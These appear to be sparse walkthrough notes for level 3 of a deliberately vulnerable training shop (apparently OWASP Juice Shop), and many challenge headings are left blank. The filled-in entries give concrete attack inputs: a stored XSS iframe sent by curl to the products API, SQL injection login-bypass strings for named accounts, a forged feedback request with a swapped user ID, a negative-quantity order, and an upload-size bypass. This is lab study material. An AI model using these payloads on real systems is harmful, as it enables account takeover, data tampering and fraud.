# Level 3

## API Only XSS
We need to change the description of a product to <ifarame src=\"javascript:alert('xss')\">
To do this we need to know if we can change the value of a product:

```
curl -X OPTIONS -D - 'http://127.0.0.1:3000/api/products/6'
```

The response said us that we can use POST. Now we change the value of description.

```
curl -X PUT "http://localhost:3000/api/Products/1" -H "Content-Type: application/json" --data-binary '{"description":"<ifarame src=\"javascript:alert('xss')\">"}'
```

## Admin Registration

## Bjoern's Favorite Pet

## CAPTCHA Baypass

## Client-side XSS Protection

## Database Schema

## Forged Feedback

We need to login as an user and give a feedback. We need to intercept the request and than chage the UserId to an id number of another user.

```
{"UserId":2,"comment":"asdf","rating":3}
```

## Forged Review

## GDPR Data Erasure

## Login Amy

## Login Bender

It's a SQL injection on the login page:
```
' or 1=1 and email like('%bender%') --
```

## Login Jim

It's a SQL injection on the login page:
```
' or 1=1 and email like('%jim%') --
```
## Manipulate Basket

## Payback Time

To resolve this we need to order, as a normal user, a new product with a negative number as quantity:

```
{"ProductId":24,"BasketId":"5","quantity":-100}
```

than you need to continue with the payments.

## Privacy Policy Inspection

## Product Tampering

## Reset Jim's Password

## Upload Size

Send a small file then intercept with burp the request and sobstitute the smal file with a larger one. In the complaint page.

## Upload Type

## XXE Data Access
